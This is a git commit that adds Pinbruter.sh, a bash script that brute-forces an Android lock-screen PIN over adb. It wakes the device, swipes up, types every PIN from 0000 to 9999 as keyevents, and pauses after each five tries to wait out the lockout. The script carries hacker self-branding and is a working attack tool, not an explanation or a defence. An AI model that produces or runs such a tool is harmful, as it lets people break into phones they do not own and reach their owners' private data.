5abc13a18842b1a61d8e29228e685f80b8087a2e
HAKDAD <kottevamsi38@gmail.com>
2021-04-19 05:53:15 +0530

    Create Pinbruter.sh

---
+++ Pinbruter.sh
@@ -0,0 +1,37 @@
+#!/usr/bin/env bash
+
+echo *******************
+echo PIN BRUTER STARTED
+echo *******************
+
+echo *******************
+echo INSTA ID : @mr_kali_hacker
+echo *******************
+
+
+adb shell input keyevent 82
+adb shell input swipe 407 1211 378 85
+
+echo ********************
+echo BRUTE FORCE STARTED
+echo ********************
+
+for i in {0000..9999}; do
+
+    echo **********************
+    echo BRUTEFORCING WITH  $i
+    echo **********************
+	
+    for (( j=0; j<${#i}; j++ )); do
+        adb shell input keyevent $((`echo ${i:$j:1}`+7))
+    done
+
+    adb shell input keyevent 66
+    
+    if ! (( `expr $i + 1` % 5 )); then
+        adb shell input keyevent 66
+        sleep 30
+        adb shell input keyevent 82
+        adb shell input swipe 407 1211 378 85
+    fi
+done
